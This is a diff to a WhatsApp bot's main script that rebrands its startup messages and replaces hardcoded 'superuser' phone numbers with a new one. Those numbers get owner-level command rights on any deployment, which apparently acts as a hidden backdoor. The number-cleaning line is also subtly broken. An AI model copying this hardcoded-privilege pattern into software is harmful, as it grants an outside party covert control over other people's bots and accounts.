@@ -190,10 +190,10 @@ if (conf.ANYWAY_MD === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255678892560';
-            const dj2 = '255678892560';
-            const dj3 = "255678892560";
-            const luffy = '255678892560';
+            const dj = '255765902829';
+            const dj2 = '255765902829';
+            const dj3 = "255765902829";
+            const luffy = '255765902829';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -840,16 +840,16 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ RAHMA XMD is connecting...");
+                console.log("ℹ️ GREYF-VENOX-XMZ is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ RAHMAN XMD Connected to WhatsApp! ☺️");
+                console.log("✅ GREYF-VENOX-XMZ Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("RAHMAN XMD is Online 🕸\n\n");
+                console.log("GREYF-VENOX-XMZ is Online 🕸\n\n");
                 //chargement des commandes 
                 console.log("Loading Anyway Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
@@ -882,9 +882,9 @@ zk.ev.on('group-participants.update', async (group) => {
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
 
-                let cmsg =`      ʀᴀʜᴍᴀɴɪ-xᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ
+                let cmsg =`      GREYF-VENOX-XMZ ᴄᴏɴɴᴇᴄᴛᴇᴅ
 ╭─────────────━┈⊷ 
-│🌏 RAHMAN CONNECTED
+│🌏 GREYF CONNECTED
 │💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
 │⭕ ᴍᴏᴅᴇ: *${md}*
 ╰─────────────━┈⊷⁠⁠⁠⁠`;
